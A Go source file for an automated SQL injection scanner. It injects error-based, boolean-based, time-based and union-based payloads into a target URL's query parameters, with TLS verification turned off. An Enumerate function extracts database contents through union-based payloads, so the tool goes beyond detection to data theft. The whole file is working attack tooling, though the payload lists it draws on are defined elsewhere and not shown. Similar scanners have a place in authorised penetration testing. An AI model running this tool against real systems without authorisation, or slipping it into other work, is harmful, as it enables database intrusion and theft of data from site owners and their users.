package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

type Result struct {
	URL       string `json:"url"`
	Parameter string `json:"parameter"`
	Payload   string `json:"payload"`
	Type      string `json:"type"` // Error, Boolean, Time
	DBMS      string `json:"dbms"`
	Details   string `json:"details"`
}

type Scanner struct {
	Client *http.Client
}

func NewScanner(timeout int) *Scanner {
	return &Scanner{
		Client: &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
			Timeout: time.Duration(timeout) * time.Second,
		},
	}
}

func (s *Scanner) Scan(targetURL string) []Result {
	results := make([]Result, 0)
	u, err := url.Parse(targetURL)
	if err != nil {
		return results
	}

	params := u.Query()
	if len(params) == 0 {
		return results
	}

	// Base request for comparison
	baseResp, err := s.Client.Get(targetURL)
	if err != nil {
		return results
	}
	baseBody, _ := io.ReadAll(baseResp.Body)
	baseResp.Body.Close()
	baseLen := len(baseBody)

	var wg sync.WaitGroup
	var mutex sync.Mutex
	sem := make(chan struct{}, 10) // Concurrency limit

	for param := range params {
		// Error Based
		wg.Add(1)
		sem <- struct{}{}
		go func(p string) {
			defer wg.Done()
			defer func() { <-sem }()
			s.checkError(u, params, p, "'", &results, &mutex)
			s.checkError(u, params, p, "\"", &results, &mutex)
		}(param)

		// Boolean Based
		for _, pay := range BooleanPayloads {
			wg.Add(1)
			sem <- struct{}{}
			go func(p string, pay BooleanPayload) {
				defer wg.Done()
				defer func() { <-sem }()
				s.checkBoolean(u, params, p, pay, baseLen, &results, &mutex)
			}(param, pay)
		}

		// Time Based
		for _, pay := range TimePayloads {
			wg.Add(1)
			sem <- struct{}{}
			go func(p, pay string) {
				defer wg.Done()
				defer func() { <-sem }()
				s.checkTime(u, params, p, pay, &results, &mutex)
			}(param, pay)
		}
		// Union Based
		for _, pay := range UnionPayloads {
			wg.Add(1)
			sem <- struct{}{}
			go func(p, pay string) {
				defer wg.Done()
				defer func() { <-sem }()
				s.checkUnion(u, params, p, pay, baseLen, &results, &mutex)
			}(param, pay)
		}
	}
	wg.Wait()
	return results
}

func (s *Scanner) checkUnion(u *url.URL, params url.Values, p, pay string, baseLen int, results *[]Result, mutex *sync.Mutex) {
	attackURL := buildURL(u, params, p, pay)
	resp, err := s.Client.Get(attackURL)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	// Simple heuristic: Union often causes visible changes or specific patterns
	// For now, we look for typical successful union indicators (like "NULL" reflection or length change)
	if len(body) != baseLen && !strings.Contains(bodyStr, "SQL syntax") {
		// This is a very basic check, can be improved with reflection detection
		mutex.Lock()
		*results = append(*results, Result{
			URL:       attackURL,
			Parameter: p,
			Payload:   pay,
			Type:      "Union-Based (Potential)",
			Details:   fmt.Sprintf("Length change detected (%d vs %d)", len(body), baseLen),
		})
		mutex.Unlock()
	}
}

func (s *Scanner) checkError(u *url.URL, params url.Values, p, pay string, results *[]Result, mutex *sync.Mutex) {
	attackURL := buildURL(u, params, p, pay)
	resp, err := s.Client.Get(attackURL)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	for _, pattern := range ErrorPatterns {
		if strings.Contains(bodyStr, pattern) {
			mutex.Lock()
			*results = append(*results, Result{
				URL:       attackURL,
				Parameter: p,
				Payload:   pay,
				Type:      "Error-Based",
				Details:   "Found error pattern: " + pattern,
			})
			mutex.Unlock()
			return
		}
	}
}

func (s *Scanner) checkBoolean(u *url.URL, params url.Values, p string, pay BooleanPayload, baseLen int, results *[]Result, mutex *sync.Mutex) {
	// 1. Request with TRUE payload
	trueURL := buildURL(u, params, p, pay.True)
	trueResp, err := s.Client.Get(trueURL)
	if err != nil {
		return
	}
	defer trueResp.Body.Close()
	trueBody, _ := io.ReadAll(trueResp.Body)
	trueLen := len(trueBody)

	// 2. Request with FALSE payload
	falseURL := buildURL(u, params, p, pay.False)
	falseResp, err := s.Client.Get(falseURL)
	if err != nil {
		return
	}
	defer falseResp.Body.Close()
	falseBody, _ := io.ReadAll(falseResp.Body)
	falseLen := len(falseBody)

	// 3. Logic: True length should be similar to base, and significantly different from False length
	// Or True length != False length while True length == Base length
	diffThreshold := 0.05 // 5% difference

	isTrueSimilarToBase := float64(abs(trueLen-baseLen)) < float64(baseLen)*diffThreshold
	isFalseDifferentFromTrue := float64(abs(trueLen-falseLen)) > float64(trueLen)*diffThreshold

	if isTrueSimilarToBase && isFalseDifferentFromTrue {
		mutex.Lock()
		*results = append(*results, Result{
			URL:       trueURL,
			Parameter: p,
			Payload:   pay.True,
			Type:      "Boolean-Based",
			Details:   fmt.Sprintf("True length (%d) != False length (%d)", trueLen, falseLen),
		})
		mutex.Unlock()
	}
}

func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}

func (s *Scanner) checkTime(u *url.URL, params url.Values, p, pay string, results *[]Result, mutex *sync.Mutex) {
	attackURL := buildURL(u, params, p, pay)
	start := time.Now()
	resp, err := s.Client.Get(attackURL)
	if err != nil {
		if strings.Contains(err.Error(), "Timeout") || time.Since(start) > 5*time.Second {
			mutex.Lock()
			*results = append(*results, Result{
				URL:       attackURL,
				Parameter: p,
				Payload:   pay,
				Type:      "Time-Based",
				Details:   "Response delayed (Timeout)",
			})
			mutex.Unlock()
		}
		return
	}
	defer resp.Body.Close()

	if time.Since(start) > 5*time.Second {
		mutex.Lock()
		*results = append(*results, Result{
			URL:       attackURL,
			Parameter: p,
			Payload:   pay,
			Type:      "Time-Based",
			Details:   fmt.Sprintf("Response took %v", time.Since(start)),
		})
		mutex.Unlock()
	}
}

func buildURL(u *url.URL, params url.Values, p, pay string) string {
	newParams := make(url.Values)
	for k, v := range params {
		if k == p {
			// Try both append and replace for better coverage?
			// For now sticking to append as in original logic, but can be improved later.
			newParams.Set(k, v[0]+pay)
		} else {
			newParams[k] = v
		}
	}
	u.RawQuery = newParams.Encode()
	return u.String()
}

// Enumerate performs data extraction based on target type
func (s *Scanner) Enumerate(targetURL string, p string, dbms string, enumType string) Result {
	res := Result{URL: targetURL, Parameter: "enumeration", Type: enumType, DBMS: dbms}
	
	u, err := url.Parse(targetURL)
	if err != nil {
		return res
	}
	params := u.Query()
	
	payloads, ok := EnumPayloads[dbms]
	if !ok {
		return res
	}
	
	payload, ok := payloads[enumType]
	if !ok {
		return res
	}
	
	attackURL := buildURL(u, params, p, payload)
	resp, err := s.Client.Get(attackURL)
	if err != nil {
		return res
	}
	defer resp.Body.Close()
	
	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)
	
	// Extraction logic: Look for patterns or specific tags if we use tags in payloads
	// For now, assume the result is reflected in the body (Union-based)
	// We can improve this using the C++ parsing engine later.
	res.Payload = bodyStr
	return res
}
